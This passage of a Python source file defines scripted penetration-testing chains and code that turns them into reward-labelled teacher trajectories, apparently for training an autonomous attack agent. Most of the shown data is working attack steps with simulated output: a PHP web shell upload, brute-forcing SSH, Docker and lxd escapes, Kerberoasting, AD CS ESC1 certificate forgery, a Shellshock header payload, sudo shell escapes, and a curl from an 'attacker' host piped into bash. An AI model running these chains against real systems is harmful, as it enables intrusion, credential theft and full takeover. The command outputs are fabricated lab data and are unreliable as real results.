                    {"discovery_type": "WEB_PATH", "value": "/backup/db_dump.sql", "confidence": 0.9, "source_stage": "regex"},
                ],
                "reward": 6.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "ENUMERATION",
                "family": "wfuzz",
                "cmd": "wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://{ip}/admin/FUZZ.php",
                "template": "wfuzz_dir",
                "reasoning": "Fuzz for PHP files inside admin directory",
                "expected": "Find admin panel endpoints",
                "output": "000000001:   200        45 L     128 W   2345 Ch  \"login\"\n000000023:   200        12 L      34 W    567 Ch  \"upload\"\n000000089:   302         0 L       0 W      0 Ch  \"dashboard\"",
                "discoveries": [
                    {"discovery_type": "WEB_PATH", "value": "/admin/upload.php", "confidence": 0.9, "source_stage": "regex"},
                ],
                "reward": 3.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "EXPLOITATION",
                "family": "curl",
                "cmd": "curl -F 'file=@shell.php' http://{ip}/admin/upload.php",
                "template": "curl_upload",
                "reasoning": "Upload PHP reverse shell via file upload form",
                "expected": "Upload web shell for RCE",
                "output": "File uploaded successfully to /uploads/shell.php",
                "discoveries": [],
                "reward": 5.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "EXPLOITATION",
                "family": "nc",
                "cmd": "curl http://{ip}/uploads/shell.php",
                "template": "nc_reverse",
                "reasoning": "Trigger uploaded shell to get reverse connection",
                "expected": "Get user-level shell as www-data",
                "output": "$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
                "discoveries": [
                    {"discovery_type": "SHELL", "value": "user_shell", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 40.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "PRIVILEGE_ESCALATION",
                "family": "sudo",
                "cmd": "sudo -l",
                "template": "sudo_list",
                "reasoning": "Check sudo permissions for www-data",
                "expected": "Find misconfigured sudo entry",
                "output": "(ALL) NOPASSWD: /usr/bin/vim",
                "discoveries": [
                    {"discovery_type": "VULNERABILITY", "value": "sudo-vim-nopasswd", "confidence": 0.95, "source_stage": "regex"},
                ],
                "reward": 10.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "PRIVILEGE_ESCALATION",
                "family": "manual",
                "cmd": "sudo vim -c ':!/bin/bash'",
                "template": "sudo_vim_escape",
                "reasoning": "Escape to root shell via vim sudo entry",
                "expected": "Get root shell",
                "output": "root@target:~# id\nuid=0(root) gid=0(root)",
                "discoveries": [
                    {"discovery_type": "ROOT_SHELL", "value": "root_shell", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 80.0,
                "is_wrong": False,
                "lesson": "",
            },
        ],
    },
    {
        "name": "docker_lxd_container_escape",
        "difficulty": "medium",
        "service_mix": "http,ssh",
        "target_ip": "10.10.10.8",
        "steps": [
            {
                "phase": "RECON",
                "family": "nmap",
                "cmd": "nmap -sC -sV {ip}",
                "template": "nmap_service_version",
                "reasoning": "Service scan",
                "expected": "Find HTTP and SSH",
                "output": "22/tcp open ssh OpenSSH 7.9p1\n80/tcp open http nginx 1.18",
                "discoveries": [
                    {"discovery_type": "PORT", "value": "22", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "PORT", "value": "80", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 5.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "ENUMERATION",
                "family": "gobuster",
                "cmd": "gobuster dir -u http://{ip} -w /usr/share/dirb/wordlists/common.txt",
                "template": "gobuster_dir",
                "reasoning": "Enumerate web directories",
                "expected": "Find web content",
                "output": "/login (Status: 200)\n/api (Status: 301)",
                "discoveries": [
                    {"discovery_type": "WEB_PATH", "value": "/login", "confidence": 0.9, "source_stage": "regex"},
                ],
                "reward": 3.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "EXPLOITATION",
                "family": "hydra",
                "cmd": "hydra -l devops -P /usr/share/wordlists/rockyou.txt ssh://{ip}",
                "template": "hydra_ssh",
                "reasoning": "Brute force SSH with default username",
                "expected": "Find valid credentials",
                "output": "[22][ssh] host: {ip}   login: devops   password: devops123",
                "discoveries": [
                    {"discovery_type": "CREDENTIAL", "value": "devops:devops123", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "SHELL", "value": "user_shell", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 60.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "PRIVILEGE_ESCALATION",
                "family": "linpeas",
                "cmd": "curl http://attacker/linpeas.sh | bash",
                "template": "linpeas_ms2",
                "reasoning": "Check for privesc vectors",
                "expected": "Find container group membership",
                "output": "╔══════════╣ My user\nuid=1000(devops) gid=1000(devops) groups=1000(devops),999(docker),998(lxd)\n╔══════════╣ Container related\n[+] User is in docker group!\n[+] User is in lxd group!",
                "discoveries": [
                    {"discovery_type": "VULNERABILITY", "value": "docker-group-membership", "confidence": 0.95, "source_stage": "regex"},
                    {"discovery_type": "VULNERABILITY", "value": "lxd-group-membership", "confidence": 0.95, "source_stage": "regex"},
                ],
                "reward": 10.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "PRIVILEGE_ESCALATION",
                "family": "lxd",
                "cmd": "lxc init ubuntu:16.04 privesc -c security.privileged=true && lxc config device add privesc mydevice disk source=/ path=/mnt/root && lxc start privesc && lxc exec privesc /bin/sh",
                "template": "lxd_privesc",
                "reasoning": "Wrong approach first — lxd is slower; try docker first as it's simpler",
                "expected": "This works but docker escape is faster",
                "output": "Error: not found\nThe container could not be found",
                "discoveries": [],
                "reward": -1.5,
                "is_wrong": True,
                "lesson": "When in both docker and lxd groups, prefer docker escape first — it's faster and more reliable.",
            },
            {
                "phase": "PRIVILEGE_ESCALATION",
                "family": "docker",
                "cmd": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
                "template": "docker_privesc",
                "reasoning": "Mount host root filesystem into privileged container",
                "expected": "Get root shell on host via docker escape",
                "output": "# id\nuid=0(root) gid=0(root) groups=0(root)\n# hostname\ntarget\n# cat /mnt/root/root.txt\nflag{docker_escape_root}",
                "discoveries": [
                    {"discovery_type": "ROOT_SHELL", "value": "root_shell", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "FLAG", "value": "root_flag:docker_escape_root", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 100.0,
                "is_wrong": False,
                "lesson": "",
            },
        ],
    },
    {
        "name": "ad_certipy_rubeus_chain",
        "difficulty": "hard",
        "service_mix": "ldap,smb,winrm,dns,http",
        "target_ip": "10.10.10.9",
        "steps": [
            {
                "phase": "RECON",
                "family": "nmap",
                "cmd": "nmap -sC -sV -p- {ip}",
                "template": "nmap_full_tcp",
                "reasoning": "Full scan for AD domain controller",
                "expected": "Find AD services: LDAP, Kerberos, SMB, WinRM",
                "output": "53/tcp   open  domain\n80/tcp   open  http   IIS/10.0\n88/tcp   open  kerberos-sec\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n5985/tcp open  wsman",
                "discoveries": [
                    {"discovery_type": "PORT", "value": "88", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "PORT", "value": "389", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "PORT", "value": "445", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "PORT", "value": "5985", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "SERVICE", "value": "ldap:389", "confidence": 0.95, "source_stage": "regex"},
                ],
                "reward": 15.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "ENUMERATION",
                "family": "smbmap",
                "cmd": "smbmap -H {ip} -u '' -p ''",
                "template": "smbmap_enum",
                "reasoning": "Check SMB share permissions with null session",
                "expected": "Map accessible shares",
                "output": "[+] IP: {ip}:445\tName: dc01.corp.local\n\tDisk\tPermissions\tComment\n\t----\t-----------\t-------\n\tSYSVOL\tREAD ONLY\tLogon server share\n\tNETLOGON\tREAD ONLY\tLogon server share\n\tShared\tREAD, WRITE\tPublic",
                "discoveries": [
                    {"discovery_type": "SMB_SHARE", "value": "SYSVOL", "confidence": 0.9, "source_stage": "regex"},
                    {"discovery_type": "SMB_SHARE", "value": "Shared:READ_WRITE", "confidence": 0.9, "source_stage": "regex"},
                    {"discovery_type": "HOSTNAME", "value": "dc01.corp.local", "confidence": 0.95, "source_stage": "regex"},
                ],
                "reward": 11.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "ENUMERATION",
                "family": "rpcclient",
                "cmd": "rpcclient -U '' -N {ip} -c 'enumdomusers'",
                "template": "rpcclient_null",
                "reasoning": "Enumerate domain users via RPC null session",
                "expected": "List all domain users",
                "output": "user:[Administrator] rid:[0x1f4]\nuser:[Guest] rid:[0x1f5]\nuser:[krbtgt] rid:[0x1f6]\nuser:[svc_web] rid:[0x44f]\nuser:[j.smith] rid:[0x450]",
                "discoveries": [
                    {"discovery_type": "DOMAIN_USER", "value": "svc_web", "confidence": 0.9, "source_stage": "regex"},
                    {"discovery_type": "DOMAIN_USER", "value": "j.smith", "confidence": 0.9, "source_stage": "regex"},
                ],
                "reward": 8.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "EXPLOITATION",
                "family": "rubeus",
                "cmd": "Rubeus.exe kerberoast /outfile:hashes.txt",
                "template": "rubeus_kerberoast",
                "reasoning": "Kerberoast service accounts to get crackable TGS hashes",
                "expected": "Get TGS hash for svc_web service account",
                "output": "[*] Action: Kerberoasting\n[*] NOTICE: AES hash is used\n[*] Target User: svc_web\n[*] Hash written to: hashes.txt\n\n$krb5tgs$23$*svc_web$CORP.LOCAL$HTTP/web01.corp.local*$a1b2c3d4e5f6...",
                "discoveries": [
                    {"discovery_type": "HASH", "value": "krb5tgs:svc_web", "confidence": 0.95, "source_stage": "regex"},
                ],
                "reward": 16.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "EXPLOITATION",
                "family": "manual",
                "cmd": "hashcat -m 13100 hashes.txt rockyou.txt --force",
                "template": "hashcat_tgs",
                "reasoning": "Crack TGS hash offline",
                "expected": "Recover svc_web password",
                "output": "$krb5tgs$23$*svc_web$CORP.LOCAL*:WebService2024!",
                "discoveries": [
                    {"discovery_type": "CREDENTIAL", "value": "svc_web:WebService2024!", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 20.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "EXPLOITATION",
                "family": "evil_winrm",
                "cmd": "evil-winrm -i {ip} -u svc_web -p 'WebService2024!'",
                "template": "evil_winrm",
                "reasoning": "Get shell via WinRM with cracked credentials",
                "expected": "User-level shell on domain controller",
                "output": "Evil-WinRM shell v3.4\n*Evil-WinRM* PS C:\\Users\\svc_web>",
                "discoveries": [
                    {"discovery_type": "SHELL", "value": "user_shell", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 40.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "PRIVILEGE_ESCALATION",
                "family": "certipy",
                "cmd": "certipy find -u svc_web@corp.local -p 'WebService2024!' -dc-ip {ip} -vulnerable",
                "template": "certipy_find",
                "reasoning": "Find vulnerable AD certificate templates (ESC1-ESC8)",
                "expected": "Identify misconfigured certificate template for domain admin",
                "output": "[*] Finding certificate templates\n[*] Found 34 certificate templates\n[!] Vulnerable template found: ESC1\n  Template Name: UserAuth\n  Enrollment Rights: Authenticated Users\n  Extended Key Usage: Client Authentication\n  msPKI-Certificate-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT",
                "discoveries": [
                    {"discovery_type": "VULNERABILITY", "value": "ADCS-ESC1-UserAuth", "confidence": 0.95, "source_stage": "regex"},
                ],
                "reward": 15.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "PRIVILEGE_ESCALATION",
                "family": "certipy",
                "cmd": "certipy req -u svc_web@corp.local -p 'WebService2024!' -dc-ip {ip} -ca CORP-DC01-CA -template UserAuth -upn Administrator@corp.local",
                "template": "certipy_req",
                "reasoning": "Request certificate as Administrator using ESC1 vulnerability",
                "expected": "Get certificate for Administrator account",
                "output": "[*] Requesting certificate for 'Administrator@corp.local'\n[*] Certificate created successfully\n[*] Got certificate with UPN 'Administrator@corp.local'\n[*] Saved certificate and key to 'administrator.pfx'",
                "discoveries": [
                    {"discovery_type": "TOKEN", "value": "administrator.pfx", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 25.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "PRIVILEGE_ESCALATION",
                "family": "certipy",
                "cmd": "certipy auth -pfx administrator.pfx -dc-ip {ip}",
                "template": "certipy_auth",
                "reasoning": "Authenticate as Administrator using forged certificate",
                "expected": "Get NTLM hash for Administrator",
                "output": "[*] Using principal: Administrator@corp.local\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'administrator.ccache'\n[*] Trying to retrieve NT hash...\n[*] Got NT hash for 'Administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
                "discoveries": [
                    {"discovery_type": "HASH", "value": "ntlm:Administrator:31d6cfe0d16ae931b73c59d7e0c089c0", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "ROOT_SHELL", "value": "root_shell", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 80.0,
                "is_wrong": False,
                "lesson": "",
            },
        ],
    },
    {
        "name": "smb_rpcclient_winpeas_chain",
        "difficulty": "medium",
        "service_mix": "smb,ssh,winrm",
        "target_ip": "10.10.10.10",
        "steps": [
            {
                "phase": "RECON",
                "family": "masscan",
                "cmd": "masscan -p1-65535 --rate=500 {ip}",
                "template": "masscan_full",
                "reasoning": "Fast initial port sweep",
                "expected": "Find open ports quickly",
                "output": "Discovered open port 22/tcp on {ip}\nDiscovered open port 445/tcp on {ip}\nDiscovered open port 5985/tcp on {ip}",
                "discoveries": [
                    {"discovery_type": "PORT", "value": "22", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "PORT", "value": "445", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "PORT", "value": "5985", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 7.5,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "ENUMERATION",
                "family": "rpcclient",
                "cmd": "rpcclient -U '' -N {ip} -c 'enumdomusers;enumdomgroups'",
                "template": "rpcclient_null",
                "reasoning": "Enumerate users and groups via RPC null session",
                "expected": "Find domain users and group memberships",
                "output": "user:[Administrator] rid:[0x1f4]\nuser:[svc_mssql] rid:[0x451]\ngroup:[Domain Admins] rid:[0x200]\ngroup:[Remote Management Users] rid:[0x44e]",
                "discoveries": [
                    {"discovery_type": "DOMAIN_USER", "value": "svc_mssql", "confidence": 0.9, "source_stage": "regex"},
                    {"discovery_type": "USER", "value": "Administrator", "confidence": 0.9, "source_stage": "regex"},
                ],
                "reward": 12.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "ENUMERATION",
                "family": "smbmap",
                "cmd": "smbmap -H {ip} -u guest -p ''",
                "template": "smbmap_enum",
                "reasoning": "Check share permissions with guest account",
                "expected": "Find readable shares",
                "output": "[+] IP: {ip}:445\tName: target\n\tDisk\tPermissions\tComment\n\t----\t-----------\t-------\n\tIPC$\tNO ACCESS\n\tDocs\tREAD ONLY\tDocumentation\n\tIT\tREAD, WRITE\tIT Department",
                "discoveries": [
                    {"discovery_type": "SMB_SHARE", "value": "IT:READ_WRITE", "confidence": 0.9, "source_stage": "regex"},
                ],
                "reward": 4.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "EXPLOITATION",
                "family": "smbclient",
                "cmd": "smbclient //{ip}/IT -U guest -N -c 'get creds.xml'",
                "template": "smbclient_connect",
                "reasoning": "Download credentials file from writable IT share",
                "expected": "Get GPP or config file with credentials",
                "output": "getting file \\creds.xml of size 1234 as creds.xml",
                "discoveries": [
                    {"discovery_type": "GPP_PASSWORD", "value": "svc_mssql:MSSQLSvc2024!", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 20.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "EXPLOITATION",
                "family": "evil_winrm",
                "cmd": "evil-winrm -i {ip} -u svc_mssql -p 'MSSQLSvc2024!'",
                "template": "evil_winrm",
                "reasoning": "Get shell via WinRM with found credentials",
                "expected": "User-level Windows shell",
                "output": "Evil-WinRM shell v3.4\n*Evil-WinRM* PS C:\\Users\\svc_mssql>",
                "discoveries": [
                    {"discovery_type": "SHELL", "value": "user_shell", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 40.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "PRIVILEGE_ESCALATION",
                "family": "winpeas",
                "cmd": ".\\winPEASx64.exe",
                "template": "winpeas_run",
                "reasoning": "Run WinPEAS to find Windows privilege escalation vectors",
                "expected": "Find misconfigurations or stored credentials",
                "output": "════════════════════════════════════════╗\n║ Modifiable Services                ║\n╚════════════════════════════════════════╝\n  YOURSERVICE(YourService)[C:\\Program Files\\YourService\\svc.exe]\n  Permissions: SERVICE_ALL_ACCESS\n  YOU CAN MODIFY THIS SERVICE\n\n════════════════════════════════════════╗\n║ AutoLogon Credentials              ║\n╚════════════════════════════════════════╝\n  DefaultUserName: Administrator\n  DefaultPassword: Admin2024!",
                "discoveries": [
                    {"discovery_type": "VULNERABILITY", "value": "modifiable-service-YOURSERVICE", "confidence": 0.9, "source_stage": "regex"},
                    {"discovery_type": "CREDENTIAL", "value": "Administrator:Admin2024!", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 30.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "PRIVILEGE_ESCALATION",
                "family": "evil_winrm",
                "cmd": "evil-winrm -i {ip} -u Administrator -p 'Admin2024!'",
                "template": "evil_winrm",
                "reasoning": "Use discovered AutoLogon credentials for admin access",
                "expected": "Administrator shell",
                "output": "Evil-WinRM shell v3.4\n*Evil-WinRM* PS C:\\Users\\Administrator>",
                "discoveries": [
                    {"discovery_type": "ROOT_SHELL", "value": "root_shell", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 80.0,
                "is_wrong": False,
                "lesson": "",
            },
        ],
    },
    {
        "name": "msfconsole_shellshock_chain",
        "difficulty": "easy",
        "service_mix": "http,ssh",
        "target_ip": "10.10.10.11",
        "steps": [
            {
                "phase": "RECON",
                "family": "nmap",
                "cmd": "nmap -sC -sV {ip}",
                "template": "nmap_service_version",
                "reasoning": "Initial service discovery",
                "expected": "Find HTTP and SSH",
                "output": "22/tcp open ssh OpenSSH 6.6.1\n80/tcp open http Apache httpd 2.4.10\n80/tcp open http cgi-bin",
                "discoveries": [
                    {"discovery_type": "PORT", "value": "22", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "PORT", "value": "80", "confidence": 1.0, "source_stage": "regex"},
                    {"discovery_type": "SERVICE", "value": "http:80", "confidence": 0.95, "source_stage": "regex"},
                ],
                "reward": 10.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "ENUMERATION",
                "family": "gobuster",
                "cmd": "gobuster dir -u http://{ip}/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x sh,cgi",
                "template": "gobuster_dir",
                "reasoning": "Find CGI scripts that may be vulnerable to Shellshock",
                "expected": "Discover CGI scripts in cgi-bin",
                "output": "/cgi-bin/status.sh (Status: 200)\n/cgi-bin/test.cgi (Status: 200)",
                "discoveries": [
                    {"discovery_type": "WEB_PATH", "value": "/cgi-bin/status.sh", "confidence": 0.9, "source_stage": "regex"},
                ],
                "reward": 5.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "EXPLOITATION",
                "family": "curl",
                "cmd": "curl -H 'User-Agent: () { :; }; echo; /usr/bin/id' http://{ip}/cgi-bin/status.sh",
                "template": "curl_shellshock",
                "reasoning": "Wrong: manual Shellshock test — should use Metasploit for reliable exploitation",
                "expected": "This confirms vulnerability but doesn't give a stable shell",
                "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
                "discoveries": [
                    {"discovery_type": "VULNERABILITY", "value": "CVE-2014-6271-shellshock", "confidence": 0.95, "source_stage": "regex"},
                ],
                "reward": 5.0,
                "is_wrong": True,
                "lesson": "After confirming Shellshock, use Metasploit for reliable exploitation with proper session management instead of manual curl.",
            },
            {
                "phase": "EXPLOITATION",
                "family": "msfconsole",
                "cmd": "msfconsole -q -x 'use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS {ip}; set TARGETURI /cgi-bin/status.sh; set LHOST 10.10.14.1; run'",
                "template": "msfconsole_shellshock",
                "reasoning": "Use Metasploit Shellshock module for stable reverse shell",
                "expected": "Get meterpreter or command shell session",
                "output": "[*] Started reverse TCP handler on 10.10.14.1:4444\n[*] {ip}:80 - Sending exploit...\n[*] Command shell session 1 opened (10.10.14.1:4444 -> {ip}:38942)\nuid=33(www-data) gid=33(www-data)",
                "discoveries": [
                    {"discovery_type": "SHELL", "value": "user_shell", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 40.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "PRIVILEGE_ESCALATION",
                "family": "sudo",
                "cmd": "sudo -l",
                "template": "sudo_list",
                "reasoning": "Check sudo for www-data",
                "expected": "Find sudo misconfiguration",
                "output": "(ALL) NOPASSWD: /usr/bin/perl",
                "discoveries": [
                    {"discovery_type": "VULNERABILITY", "value": "sudo-perl-nopasswd", "confidence": 0.95, "source_stage": "regex"},
                ],
                "reward": 10.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "PRIVILEGE_ESCALATION",
                "family": "manual",
                "cmd": "sudo perl -e 'exec \"/bin/bash\"'",
                "template": "sudo_perl_escape",
                "reasoning": "Escape to root via sudo perl",
                "expected": "Root shell",
                "output": "root@target:~# id\nuid=0(root) gid=0(root)",
                "discoveries": [
                    {"discovery_type": "ROOT_SHELL", "value": "root_shell", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 80.0,
                "is_wrong": False,
                "lesson": "",
            },
            {
                "phase": "EXFILTRATION",
                "family": "manual",
                "cmd": "cat /root/root.txt",
                "template": "nc_exfil",
                "reasoning": "Capture root flag",
                "expected": "Root flag",
                "output": "flag{shellshock_2_root}",
                "discoveries": [
                    {"discovery_type": "FLAG", "value": "root_flag:shellshock_2_root", "confidence": 1.0, "source_stage": "regex"},
                ],
                "reward": 50.0,
                "is_wrong": False,
                "lesson": "",
            },
        ],
    },
]


def _augment_chain(
    chain: Dict[str, Any],
    rng: random.Random,
    trajectory_idx: int,
) -> Dict[str, Any]:
    """Create a variant of the expert chain with noise."""
    from scripts.distill_prep.trace_schema import DISTILL_PREP_VERSION

    chain = json.loads(json.dumps(chain))  # Deep copy
    # Randomize IP
    chain["target_ip"] = f"10.10.10.{rng.randint(1, 254)}"

    # Sometimes add extra wrong moves
    if rng.random() < 0.4 and len(chain["steps"]) > 3:
        insert_idx = rng.randint(1, len(chain["steps"]) - 1)
        wrong_step = {
            "phase": chain["steps"][insert_idx]["phase"],
            "family": rng.choice(["nmap", "curl", "manual"]),
            "cmd": f"nmap -sC {chain['target_ip']}",
            "template": "nmap_service_version",
            "reasoning": "Unnecessary re-scan — already have this information",
            "expected": "Duplicate scan wastes time",
            "output": "Host is up (0.001s latency).",
            "discoveries": [],
            "reward": -1.5,
            "is_wrong": True,
            "lesson": "Avoid repeating scans when results are already available.",
        }
        chain["steps"].insert(insert_idx, wrong_step)

    # Slightly perturbate rewards (clamped to valid range)
    for step in chain["steps"]:
        if not step["is_wrong"]:
            step["reward"] = round(
                max(-15.0, min(100.0, step["reward"] * rng.uniform(0.85, 1.15))),
                3,
            )
        step["cmd"] = step["cmd"].replace("{ip}", chain["target_ip"])
        step["output"] = step["output"].replace("{ip}", chain["target_ip"])

    return chain


def generate_teacher_trajectories(
    n_trajectories: int = 100,
    seed: int = 42,
    outdir: Optional[str] = None,
    weakness_report_path: Optional[str] = None,
) -> List[Path]:
    """Generate teacher trajectory JSONL files.

    Returns list of written file paths.
    """
    from scripts.distill_prep.trace_schema import (
        DISTILL_PREP_VERSION,
        DiscoveryRecord,
        PHASE_ORDER,
        TeacherStep,
        TeacherTrajectory,
    )

    rng = random.Random(seed)
    if outdir is None:
        outdir = "data/distill_prep/teacher_trajectories"
    out_path = Path(outdir)
    out_path.mkdir(parents=True, exist_ok=True)

    # Load weakness report if available (for curriculum weighting)
    _weakness: Optional[Dict[str, Any]] = None
    if weakness_report_path and os.path.exists(weakness_report_path):
        with open(weakness_report_path, "r", encoding="utf-8") as f:
            _weakness = json.load(f)
        logger.info("Loaded weakness report from %s", weakness_report_path)

    written: List[Path] = []
    chain_pool = EXPERT_CHAINS

    for traj_idx in range(n_trajectories):
        chain_template = rng.choice(chain_pool)
        chain = _augment_chain(chain_template, rng, traj_idx)

        trajectory_id = f"teacher_{traj_idx:04d}"
        steps: List[TeacherStep] = []
        total_reward = 0.0
        highest_phase = "RECON"
        wrong_count = 0

        for step_num, raw_step in enumerate(chain["steps"]):
            disc_records = [
                DiscoveryRecord(
                    discovery_type=d["discovery_type"],
                    value=d["value"],
                    confidence=d.get("confidence", 1.0),
                    source_stage=d.get("source_stage", "regex"),
                )
                for d in raw_step.get("discoveries", [])
            ]

            step = TeacherStep(
                phase=raw_step["phase"],
                state_before={
                    "phase": raw_step["phase"],
                    "step": step_num,
                    "discoveries_count": sum(
                        len(s.get("discoveries", []))
                        for s in chain["steps"][:step_num]
                    ),
                },
                command_family=raw_step["family"],
                full_command=raw_step["cmd"],
                template_name=raw_step.get("template", ""),
                reasoning=raw_step["reasoning"],
                expected_outcome=raw_step["expected"],
                stdout_snippet=raw_step["output"][:200],
                discoveries=disc_records,
                reward=raw_step["reward"],
                is_wrong_move=raw_step["is_wrong"],
                tactical_lesson=raw_step.get("lesson", ""),
                decision_source="teacher",
                confidence=round(rng.uniform(0.7, 0.98), 3),
                step_num=step_num,
            )
            steps.append(step)
            total_reward += raw_step["reward"]
            if raw_step["is_wrong"]:
                wrong_count += 1

            phase_i = _phase_index(raw_step["phase"])
            if phase_i > _phase_index(highest_phase):
                highest_phase = raw_step["phase"]

        trajectory = TeacherTrajectory(
            trajectory_id=trajectory_id,
            scenario_id=f"scenario_{chain['difficulty']}_00",
            scenario_name=chain["name"],
            difficulty=chain["difficulty"],
            service_mix=chain["service_mix"],
            target_ip=chain["target_ip"],
            steps=steps,
            total_reward=round(total_reward, 3),
            highest_phase=highest_phase,
            success=_phase_index(highest_phase) >= 5,
            wrong_move_count=wrong_count,
            seed=seed + traj_idx,
        )

        # Validate
        errors = trajectory.validate()
        if errors:
            logger.warning(
                "Trajectory %s has %d validation errors: %s",
                trajectory_id, len(errors), errors[:3],
            )

        # Write
        filepath = out_path / f"teacher_{traj_idx:04d}.jsonl"
        lines = trajectory.to_jsonl_lines()
        with open(filepath, "w", encoding="utf-8") as f:
            for line in lines:
                f.write(line + "\n")
        written.append(filepath)

        if (traj_idx + 1) % 25 == 0:
            logger.info("Generated %d/%d trajectories", traj_idx + 1, n_trajectories)

    logger.info(
        "Wrote %d teacher trajectories (version=%s) to %s",
        len(written), DISTILL_PREP_VERSION, out_path,
    )
    return written


def _phase_index(phase: str) -> int:
    from scripts.distill_prep.trace_schema import PHASE_ORDER

    try:
        return PHASE_ORDER.index(phase)
    except ValueError:
        return 0


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


def main() -> None:
    """CLI entry point."""
    try:
        from rich.console import Console
    except ImportError:
        Console = None  # type: ignore[assignment,misc]

    parser = argparse.ArgumentParser(
        description="Generate teacher trajectories for distillation"
    )
    parser.add_argument(
        "--trajectories", type=int, default=100, help="Number of trajectories"
    )
    parser.add_argument("--seed", type=int, default=42, help="Random seed")
    parser.add_argument(
        "--outdir",
        type=str,
        default="data/distill_prep/teacher_trajectories",
        help="Output directory",
    )
    parser.add_argument(
        "--weakness-report",
        type=str,
        default="data/distill_prep/curriculum/weakness_report.json",
        help="Path to weakness report (optional)",
    )
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO, format="%(name)s %(message)s")

    paths = generate_teacher_trajectories(
        args.trajectories, args.seed, args.outdir, args.weakness_report
    )

    if Console is not None:
        console = Console()
        console.print(
            f"\n[bold green]Generated {len(paths)} teacher trajectories[/bold green]"
        )
    else:
        logger.info("Generated %d trajectories", len(paths))


if __name__ == "__main__":
    main()
